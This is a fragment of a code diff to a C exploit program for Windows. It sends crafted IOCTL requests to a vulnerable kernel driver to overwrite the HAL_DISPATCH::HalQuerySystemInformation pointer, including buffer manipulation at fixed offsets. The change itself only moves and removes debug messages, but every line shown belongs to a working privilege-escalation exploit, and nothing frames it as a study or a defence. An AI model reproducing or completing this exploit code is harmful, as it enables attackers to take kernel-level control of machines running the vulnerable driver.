@@ -396,6 +396,8 @@ int _tmain(int argc, _TCHAR* argv[])
     UCHAR Buff[EXPL_BUFF_SIZE];
     ZeroMemory(Buff, sizeof(Buff));    
 
+    DbgMsg(__FILE__, __LINE__, "Buff = "IFMT"\n", &Buff);
+
     GET_NATIVE(NtDeviceIoControlFile);
     GET_NATIVE(NtQueryIntervalProfile);
     GET_NATIVE(NtQuerySystemInformation);      
@@ -412,9 +414,7 @@ int _tmain(int argc, _TCHAR* argv[])
             __FILE__, __LINE__,                                 \
             "IOCTL 0x%.8x: status = 0x%.8x, info = 0x%.8x\n",   \
             (_code_), ns, StatusBlock.Information               \
-        );
-
-    DbgMsg(__FILE__, __LINE__, "Buff = "IFMT"\n", &Buff);
+        );    
 
 #ifdef _AMD64_
 
@@ -454,22 +454,12 @@ int _tmain(int argc, _TCHAR* argv[])
     /*
         Call vulnreable driver and modify HAL_DISPATCH::HalQuerySystemInformation
     */
-    ns = SEND_IOCTL(dwCode, (PVOID)&Buff, sizeof(Buff), (PVOID)&Buff, sizeof(Buff));
-    
-    DbgMsg(
-        __FILE__, __LINE__, "IOCTL 0x%.8x: status = 0x%.8x, info = 0x%.8x\n", 
-        dwCode, ns, StatusBlock.Information
-    );
+    ns = SEND_IOCTL(dwCode, (PVOID)&Buff, sizeof(Buff), (PVOID)&Buff, sizeof(Buff));   
 
     *(PDWORD64)&Buff[0x00] += sizeof(DWORD);
     *(PDWORD)&Buff[0x58] = Val.HighPart;
 
     ns = SEND_IOCTL(dwCode, (PVOID)&Buff, sizeof(Buff), (PVOID)&Buff, sizeof(Buff));
-    
-    DbgMsg(
-        __FILE__, __LINE__, "IOCTL 0x%.8x: status = 0x%.8x, info = 0x%.8x\n", 
-        dwCode, ns, StatusBlock.Information
-    );
 
 #else
 
